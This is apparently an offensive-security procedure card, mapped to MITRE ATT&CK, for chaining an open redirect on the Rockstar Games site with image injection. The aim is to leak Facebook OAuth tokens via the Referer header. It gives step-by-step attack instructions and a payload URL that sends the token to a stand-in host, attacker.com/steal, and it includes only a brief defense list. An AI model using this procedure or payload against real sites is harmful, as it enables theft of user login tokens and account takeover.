---
id: proc-uuid-002
tags:
  - open-redirect
  - oauth-theft
  - referer-leak
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Steal Web Session Cookie]]'
updated_at: '2025-12-14T17:24:35.325Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Steal Web Session Cookie]]'
---
# Chain Open Redirect for Token Exfiltration

## Summary

This procedure chains an open redirect vulnerability with image injection to manipulate the Referer header during Facebook OAuth flows, exfiltrating tokens to an attacker-controlled server.

## Description

The open redirect flaw allows redirection to arbitrary URLs without validation. When combined with image injection, the img src can be set to the redirect endpoint pointing to an attacker site. During OAuth authentication, the Referer header sent with the image load request includes sensitive token data, enabling theft. This targets users logging in via Facebook on the Rockstar site, with outcomes including full token capture for account compromise.

## Requirements

1. Control of an external server to host the exfiltration endpoint (e.g., attacker.com/steal)
2. Knowledge of the open redirect URL parameter
3. Victim in an OAuth flow state on the target site

## Defense

Defensive measures and detection strategies:

- Validate redirect URLs against a whitelist of allowed domains
- Strip or suppress Referer headers using Referrer-Policy: no-referrer
- Log and alert on redirects to external domains from authenticated sessions

## Objectives

1. Trigger open redirect via injected image
2. Capture OAuth token in Referer header
3. Exfiltrate data to attacker server

## Instructions

### Step 1: Identify Open Redirect Endpoint

**Context**: Test for open redirect by appending a URL parameter to site endpoints.

Navigate to potential URLs like https://www.rockstargames.com/redirect?url=https://example.com and observe if it redirects without validation.

**Expected Output**: Successful redirect to example.com.

### Step 2: Craft Chained Payload

**Context**: Combine with image injection by setting src to the redirect URL.

Use a payload like `https://www.rockstargames.com/redirect?url=https%3A%2F%2Fattacker.com%2Fsteal%3Fref%3D{{token}}` in the img src via DevTools.

**Expected Output**: Image request triggers redirect, sending Referer to attacker.com.

### Step 3: Trigger During OAuth and Capture

**Context**: Simulate or wait for Facebook login to include token in Referer.

Load the injected page during OAuth flow; monitor attacker server logs for incoming requests with token in Referer header.

**Expected Output**: Log entry showing Referer: https://www.rockstargames.com/oauth?token=abc123...

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Steal Web Session Cookie]] Steal Web Session Cookie

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- open-redirect
- token-theft
- referer-manipulation
